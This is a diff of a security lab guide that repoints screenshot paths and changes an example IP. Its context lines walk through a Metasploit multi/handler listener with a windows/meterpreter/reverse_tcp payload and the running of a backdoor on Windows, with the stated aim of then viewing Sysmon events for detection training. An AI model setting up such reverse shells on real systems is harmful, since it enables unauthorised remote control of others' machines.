@@ -19,20 +19,19 @@ When you get the User Account Control Prompt, select Yes.
 
 And, open a Ubuntu command prompt:
 
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
+![](../AppLocker/attachments/Clipboard_2020-06-17-08-32-51.png)
 
 On your Linux system, please run the following command:
 
 $`ifconfig`
 
-![](attachments/Clipboard_2020-06-12-12-35-15.png)
+![](../AppLocker/attachments/Clipboard_2020-06-12-12-35-15.png)
 
 Please note the IP address of your Ethernet adapter.  
 
-Please note that my adaptor is called eth0 and my IP address is 172.26.19.133.   
+Please note that my adaptor is called eth0 and my IP address is 172.31.141.100.   
 
 Your IP Address and adapter name may be different.
-
 
 Now, run the following commands to start a simple backdoor and backdoor listener: 
  
@@ -65,21 +64,19 @@ msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
 
 PAYLOAD => windows/meterpreter/reverse_tcp
 
-msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
+msf5 exploit(multi/handler) > `set LHOST 172.31.141.100`
 
 Remember, your IP will be different!
 
 msf5 exploit(multi/handler) > `exploit`
 
-
 It should look like this:
 
-![](attachments/Clipboard_2020-06-12-12-46-10.png)
+![](../AppLocker/attachments/Clipboard_2020-06-12-12-46-10.png)
 
 Now, we will need to open an cmd.exe terminal as Administrator.
 
-
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
+![](../AppLocker/attachments/cmd-command-prompt.png)
 
 When you get the pop up select Yes.
 
@@ -88,8 +85,6 @@ Next, to open a Command Prompt Window, select the Down Carrot ![](attachments\Cl
 ![](attachments/Clipboard_2020-06-12-10-38-52.png)
 
 Then, type the following:
-
-
 
 C:\Windows\system32>`cd \Tools`
 
@@ -115,12 +110,12 @@ Then, run it.
 
 It should look like this:
 
-![](attachments/TrustMe.png)
+![](../AppLocker/attachments/TrustMe.png)
 
 
 Back at your Ubuntu prompt, you should have a metasploit session!
 
-![](attachments/Clipboard_2020-06-12-12-55-11.png)
+![](../AppLocker/attachments/Clipboard_2020-06-12-12-55-11.png)
 
 
 Now, we need to view the Sysmon events for this malware:
